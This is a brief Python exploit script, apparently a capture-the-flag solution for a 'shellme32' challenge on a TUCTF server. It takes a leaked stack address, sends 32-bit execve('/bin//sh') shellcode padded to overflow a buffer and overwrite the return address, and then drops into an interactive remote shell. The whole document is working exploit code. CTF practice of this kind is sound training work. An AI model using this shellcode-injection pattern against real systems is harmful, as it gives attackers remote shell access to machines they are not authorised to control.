from ptrlib import *

#sock = Process("./shellme32")
sock = Socket("chal.tuctf.com", 30506)

sock.recvline()
addr_stack = int(sock.recvline(), 16)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode += b'A' * (0x28 - len(shellcode))
shellcode += p32(addr_stack)
sock.sendlineafter("> ", shellcode)

sock.interactive()
